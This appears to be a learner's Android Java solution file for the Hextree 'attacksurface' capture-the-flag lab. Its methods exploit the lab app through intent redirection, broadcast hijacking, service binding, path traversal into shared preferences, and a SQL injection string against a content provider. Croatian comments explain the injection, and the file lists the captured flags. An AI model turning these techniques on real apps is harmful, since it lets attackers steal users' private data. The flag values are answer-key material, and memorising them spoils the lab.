package io.hextree.webviewintent;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationManagerCompat;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;

import io.hextree.attacksurface.services.IFlag28Interface;
import io.hextree.attacksurface.services.IFlag29Interface;

public class MainActivityHextree extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("intentExtras", getIntent().toString());
        setContentView(R.layout.activity_main);

        Button sendIntentButton = findViewById(R.id.send_intent_button);
        sendIntentButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                flag6();
            }
        });
    }

    private void sendHtmlIntent() {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setComponent(new ComponentName("io.hextree.webviewdemo", "io.hextree.webviewdemo.MainActivity"));
        intent.putExtra("htmlContent", "<html><body><script>Android.showToast(\"Test!\");</script></body></html>");
        startActivity(intent);
    }

    private void flag1() {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity"));
        startActivity(intent);
    }

    private void flag2() {
        Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity"));
        startActivity(intent);
    }

    private void flag3() {
        Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity"));
        intent.setData(Uri.parse("https://app.hextree.io/map/android"));
        startActivity(intent);
    }

    private void flag4() {
        Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
        intent.setData(Uri.parse("https://app.hextree.io/map/android"));
        startActivity(intent);

        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                intent.setAction("PREPARE_ACTION");
                startActivity(intent);
            }
        }, 1500);

        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                intent.setAction("BUILD_ACTION");
                startActivity(intent);
            }
        }, 3000);

        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                intent.setAction("GET_FLAG_ACTION");
                startActivity(intent);
            }
        }, 4500);

        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                intent.setAction("GET_FLAG");
                startActivity(intent);
            }
        }, 6000);

        /*;
        ;
        */
    }

    private void flag5() {
        Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
        Intent intent3 = new Intent();
        intent3.putExtra("reason", "back");
        Intent intent2 = new Intent();
        intent2.putExtra("return", 42);
        intent2.putExtra("nextIntent", intent3);
        intent.putExtra("android.intent.extra.INTENT", intent2);
        startActivity(intent);
    }

    private void flag6() {
        Intent intentFLag6 = new Intent("OPEN");
        intentFLag6.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
        intentFLag6.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

        Intent intent = new Intent("io.hextree.action.GIVE_FLAG");
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity"));
        Intent intent3 = new Intent();
        intent3.putExtra("reason", "next");
        intent3.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity"));
        intent3.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        Intent intent2 = new Intent();
        intent2.putExtra("return", 42);
        intent2.putExtra("nextIntent", intent3);
        intent.putExtra("android.intent.extra.INTENT", intent2);
        startActivity(intent);
    }


    private void flag7() {
        Intent intent = new Intent("OPEN");
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity"));
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(intent);

        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                intent.setAction("REOPEN");
                startActivity(intent);
            }
        }, 1500);
    }

    private void flag8() {
        Intent intent = new Intent("io.hextree.FLAG33");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag8Activity");
        intent.setData(Uri.parse("content://com.android.contacts/raw_contacts"));
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivityForResult(intent, 1);
    }

    private void flag34() {
        Intent intent = new Intent("io.hextree.FLAG33");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
        intent.putExtra("filename", "flags/flag34.txt");
        startActivityForResult(intent, 42);
    }

    private void flag35() {
        Intent intent = new Intent("io.hextree.FLAG33");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
        intent.putExtra("filename", "../flag35.txt");
        startActivityForResult(intent, 42);
    }

    private void flag36Exploit() {
        Intent intent = new Intent("io.hextree.FLAG33");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
        intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
        startActivityForResult(intent, 42);
    }

    private void flag36Check() {
        Intent intent = new Intent("io.hextree.FLAG33");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag36Activity");
        startActivity(intent);
    }

    private void flag16BcstReceiver() {
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver");
        intent.putExtra("flag", "give-flag-16");
        intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
        sendBroadcast(intent);
    }

    private void flag17BcstREceiver() {
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver");
        intent.putExtra("flag", "give-flag-17");
        intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
        //sendBroadcast(intent);

        /*registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d("flag17", "registerReceiver#1");
                Log.d("flag17", intent.toString());
                Log.d("flag17", String.valueOf(getResultExtras(false)));
                Log.d("flag17", String.valueOf(getResultCode()));
//                String bundle = intent.getExtras().getString("flag", "hmm");
                // Log.d("flag17", bundle);
            }
        }, new IntentFilter("io.hextree.attacksurface.receivers.Flag17Receiver"), Context.RECEIVER_EXPORTED);*/

        //sendBroadcast(intent);


        Intent intent2 = new Intent();
        intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver");
        intent2.putExtra("flag", "give-flag-17");
        intent2.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
        //we will receive a result with data, but only if we have the permission
        BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d("flag17", "registerReceiver#2");
                Log.d("flag17", intent.toString());
                Log.d("flag17", String.valueOf(getResultExtras(false)));
                Log.d("flag17", String.valueOf(getResultCode()));
//                String bundle = intent.getExtras().getString("flag", "hmm");
               // Log.d("flag17", bundle);
            }
        };
        sendOrderedBroadcast(intent2, "io.hextree.attacksurface.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION", broadcastReceiver,  null, Activity.RESULT_OK, null, null);

    }

    private void flag18Hijack() {
        BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d("flag18", intent.toString());
                setResultCode(1);
            }
        };
        registerReceiver(broadcastReceiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"), Context.RECEIVER_EXPORTED);
    }

    private void flag19Widget() {
        Intent intent = new Intent("APPWIDGET_UPDATE");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget");
        Bundle bundle = new Bundle();
        bundle.putInt("appWidgetMaxHeight", 1094795585);
        bundle.putInt("appWidgetMinHeight", 322376503);
        intent.putExtra("appWidgetOptions", bundle);
        intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
        sendBroadcast(intent);
    }

    private void flag20Notifications() {
        if (ActivityCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") != 0) {
            if (Build.VERSION.SDK_INT >= 33) {
                ActivityCompat.requestPermissions(this, new String[]{"android.permission.POST_NOTIFICATIONS"}, 1);
            }
        } else {
            //NotificationManagerCompat.from(this).notify(1, addAction.build());
            Toast.makeText(this, "Check your notifications", Toast.LENGTH_SHORT).show();

            //catch the receiving intent, add extra values and send again (which will be received where it should)
            //it's not explicitly called, only intent filter is enough
            BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    /*intent.setAction("io.hextree.broadcast.GET_FLAG");
                    intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag20Receiver");
                    intent.putExtra("give-flag", true);
                    intent.addFlags(201326592);
                    Log.d("flag20", intent.toString());
                    sendBroadcast(intent);*/
                    intent.putExtra("give-flag", true);
                    sendBroadcast(intent);
                }
            };
            registerReceiver(broadcastReceiver, new IntentFilter("io.hextree.broadcast.GET_FLAG"), Context.RECEIVER_EXPORTED);

        }

    }

    private void flag24Service() {
        Intent intent = new Intent("io.hextree.services.START_FLAG24_SERVICE");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service");
        intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
        startService(intent);
    }

    private void flag25Service() {
        Intent intent = new Intent("io.hextree.services.UNLOCK1");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
        intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
        startService(intent);

        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                Intent intent = new Intent("io.hextree.services.UNLOCK2");
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
                intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
                startService(intent);
            }
        }, 2000);

        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                Intent intent = new Intent("io.hextree.services.UNLOCK3");
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
                intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
                startService(intent);
            }
        }, 2500);
    }

    private void flag26() {
        Intent intent = new Intent("io.hextree.services.START_FLAG24_SERVICE");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
        intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
        ServiceConnection serviceConnection = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                Messenger serviceMessenger = new Messenger(service);
                Message msg = Message.obtain(null, 42);
                try {
                    serviceMessenger.send(msg);
                } catch (RemoteException e) {

                }
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {

            }
        };
        bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
    }

    public Messenger serviceMessenger = null;

    private class IncomingHandler extends Handler {
        IncomingHandler() {
            super(Looper.getMainLooper());
        }

        @Override
        public void handleMessage(@NonNull Message msg) {
            Log.d("messageReply", msg.toString());
            Bundle b = msg.getData();
            if (b != null) {
                Log.d("messageReply", b.getString("reply", "no reply"));
            }
            if (msg.what == 2) {
                String password = msg.getData().getString("password", "");
                if (!Objects.equals(password, "")) {
                    Log.d("messageReply", password);
                    Message zero = Message.obtain(null, 3);
                    Bundle bundle = new Bundle();
                    bundle.putString("password", password);
                    zero.setData(bundle);
                    zero.replyTo = clientMessenger;
                    zero.obj = clientMessenger;
                    try {
                        serviceMessenger.send(zero);
                    } catch (RemoteException e) {
                        throw new RuntimeException(e);
                    }
                }
            }

        }
    }


    ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.d("serviceConnected", "hello");
            serviceMessenger = new Messenger(service);
            Message msg = Message.obtain(null, 1);
            Message zero = Message.obtain(null, 2);
            Bundle bundle = new Bundle();
            bundle.putString("echo", "give flag");
            msg.setData(bundle);
            zero.replyTo = clientMessenger;
            zero.obj = clientMessenger;
            msg.replyTo = clientMessenger;
            msg.obj = clientMessenger;
            try {
                serviceMessenger.send(msg);
                serviceMessenger.send(zero);
                /*serviceMessenger.send(msg);
                Timer timer = new Timer();
                timer.schedule(new TimerTask() {
                    @Override
                    public void run() {
                        Message secondMsg = Message.obtain(null, 3);
                        Bundle bundle = new Bundle();
                        bundle.putString("echo", "give flag");
                        bundle.putString("password", "none");
                        msg.setData(bundle);
                        secondMsg.replyTo = clientMessenger;
                        secondMsg.obj = clientMessenger;
                        try {
                            serviceMessenger.send(secondMsg);
                        } catch (RemoteException e) {
                            throw new RuntimeException(e);
                        }
                    }
                }, 0);*/

            } catch (RemoteException e) {

            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {

        }
    };

    Messenger clientMessenger = new Messenger(new IncomingHandler());



    private void flag27() {
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");
        intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);


        bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
    }

    private void flag28() {
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service");
        ServiceConnection mConnection = new ServiceConnection() {
            //using classloader
            /*
             ClassLoader classLoader = getForeignClassLoader(Flag28Activity.this, "io.hextree.attacksurface");
        Class<?> iRemoteServiceClass = classLoader.loadClass("io.hextree.attacksurface.services.IFlag28Interface");

        Class<?> stubClass = null;
        for (Class<?> innerClass : iRemoteServiceClass.getDeclaredClasses()) {
            if (innerClass.getSimpleName().equals("Stub")) {
                stubClass = innerClass;
                break;
            }
        }

        // Get the asInterface method
        Method asInterfaceMethod = stubClass.getDeclaredMethod("asInterface", IBinder.class);

        // Invoke the asInterface method to get the instance of IRemoteService
        Object iRemoteService = asInterfaceMethod.invoke(null, service);

        // Call the init method and get the returned string
        Method openFlagMethod = iRemoteServiceClass.getDeclaredMethod("openFlag");
        boolean initResult = (boolean) openFlagMethod.invoke(iRemoteService);
             */
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                IFlag28Interface remoteService = IFlag28Interface.Stub.asInterface(service);
                try {
                    remoteService.openFlag();
                } catch (RemoteException e) {
                    throw new RuntimeException(e);
                }
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {

            }
        };
        bindService(intent, mConnection, Context.BIND_AUTO_CREATE);
    }

    private void flag29() {
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service");
        ServiceConnection mConnection = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                IFlag29Interface remoteService = IFlag29Interface.Stub.asInterface(service);
                try {
                    String password = remoteService.init();
                    remoteService.authenticate(password);
                    remoteService.success();
                } catch (RemoteException e) {
                    throw new RuntimeException(e);
                }
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {

            }
        };
        bindService(intent, mConnection, Context.BIND_AUTO_CREATE);
    }


    private void flag30ContentProvider() {
        //Cursor cursor = getContentResolver().query(Uri.parse("/success"), null, null, null, null);
        Cursor cursor = getContentResolver().query(
                Uri.parse("content://io.hextree.flag30/success"),
                null, null,
                null, null
        );

        // dump Uri
        if (cursor!=null && cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }

    private void flag31ContentProvider() {
        //Cursor cursor = getContentResolver().query(Uri.parse("/success"), null, null, null, null);
        Cursor cursor = getContentResolver().query(
                Uri.parse("content://io.hextree.flag31/flag/31"),
                null, null,
                null, null
        );

        // dump Uri
        if (cursor!=null && cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }

    private void flag32ContentProvider() {
        //Cursor cursor = getContentResolver().query(Uri.parse("/success"), null, null, null, null);
        Cursor cursor = getContentResolver().query(
                Uri.parse("content://io.hextree.flag32/flags"),
                null, "1=1)  union select * from flag--",
                //null, null,
                null, null
        );

        /*
        znaci imamo problematicni komad koda (dynamic concat) je :

String str3 = "visible=1" + (str != null ? " AND (" + str + ")" : "");

koji kaže:

ako je str == null, str3 je visible=1
ako je str != null, dodaj AND (<user controllable input>)

prmjeti ove zagrade, malo nam prave problem. prva stvar koju želiš postići je nekako terminirati hardcodani query i ubaciti nesto svoje. imamo ovako:

select * from flag where visible = 1 AND (<user controllable input>)

s obzirom da tu imas taj nesretni and, a nakon toga je user controllable, prvo moras injectati neki true value, obicno je to 1=1, pa bi onda imali:

select * from flag where visible = 1 AND (1=1);

to je prvi dio selecta koji nesto vraca. sada zelimo ovdje napraviti uniju tako da select vrati nesto sto je nama korisno:

select * from flag where visible = 1 AND (1=1 union select username,password from users --);

primjeti da ovdje dodajes znak za komentare -- kako bi odjebao sve desno od querya, a to je u ovom slucaju ta problematicna zatvorena zagrada, pa ce se tvoj injectani query izvrsiti
         */
        // dump Uri
        if (cursor!=null && cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("flag", sb.toString());
            } while (cursor.moveToNext());
        }
    }

    private void flag33_1() {
        Intent intent = new Intent("io.hextree.FLAG33");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity1");
        startActivityForResult(intent, 1);
    }

    private void flag33_2() {
        Intent intent = new Intent();
        intent.setAction("io.hextree.FLAG33");
        intent.setData(Uri.parse("content://io.hextree.flag33_2/flags"));
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivity(intent);
    }

    private void flag37() {
        //we are giving permission to activity to use our content provider with malicious code
        Intent intent = new Intent();
        intent.setData(Uri.parse("content://io.hextree.flag37test"));
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag37Activity");
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivity(intent);


    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        //select * from flag where visible = 1 AND (1=1 union select username,password from users --);

        Log.d("File",  "actvity result : "  + requestCode + " - " + resultCode +  " " + data.toString());
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1) {
            //cursor will have data like this, so the code from jadx checking for flag33 or flag32 is checking already available data
            /*
            _id = 1, name = flag30, value = HXT{query-provider-table-1vsd8}, visible = 1
             _id = 1, name = secret, value = This is a secret note, visible = null
             _id = 2, name = flag31, value = HXT{query-uri-matcher-sakj1}, visible = 1
             _id = 2, name = flag33, value = HXT{union-select-injection-1bs98}, visible = null
             _id = 3, name = flag32, value = HXT{sql-injection-in-provider-1gs82}, visible = 0
             */
            Log.d("flag", data.toString());
            Cursor cursor = getContentResolver().query(
                    data.getData(),
                    null, null,
                    //null, "name='flag33'",
                    //null, null,
                    null, null
            );

        /*
        znaci imamo problematicni komad koda (dynamic concat) je :

String str3 = "visible=1" + (str != null ? " AND (" + str + ")" : "");

koji kaže:

ako je str == null, str3 je visible=1
ako je str != null, dodaj AND (<user controllable input>)

prmjeti ove zagrade, malo nam prave problem. prva stvar koju želiš postići je nekako terminirati hardcodani query i ubaciti nesto svoje. imamo ovako:

select * from flag where visible = 1 AND (<user controllable input>)

s obzirom da tu imas taj nesretni and, a nakon toga je user controllable, prvo moras injectati neki true value, obicno je to 1=1, pa bi onda imali:

select * from flag where visible = 1 AND (1=1);

to je prvi dio selecta koji nesto vraca. sada zelimo ovdje napraviti uniju tako da select vrati nesto sto je nama korisno:

select * from flag where visible = 1 AND (1=1 union select username,password from users --);

primjeti da ovdje dodajes znak za komentare -- kako bi odjebao sve desno od querya, a to je u ovom slucaju ta problematicna zatvorena zagrada, pa ce se tvoj injectani query izvrsiti
         */
            // dump Uri
            if (cursor!=null && cursor.moveToFirst()) {
                do {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        if (sb.length() > 0) {
                            sb.append(", ");
                        }
                        sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                    }
                    Log.d("flag", sb.toString());
                } while (cursor.moveToNext());
            }
        } else if (requestCode == 2) {

            Log.d("aaaaa", "");
        } else if (requestCode == 42) {
            try {
                Log.d("File", data.getData().toString());
                InputStream inputStream = getContentResolver().openInputStream(data.getData());
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    Log.d("File", " [*] " + line);
                }
                reader.close();
                inputStream.close();
                OutputStream outputStream = getContentResolver().openOutputStream(data.getData(), "wt");
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream));
                writer.write("<?xml version='1.0' encoding='utf-8' standalone='yes' ?>");
                writer.write("<map>");
                writer.write("<boolean name=\"solved\" value=\"true\" />");
                writer.write("</map>");
                writer.close();
                outputStream.close();


            } catch (Exception e) {

            }
        }
    }
}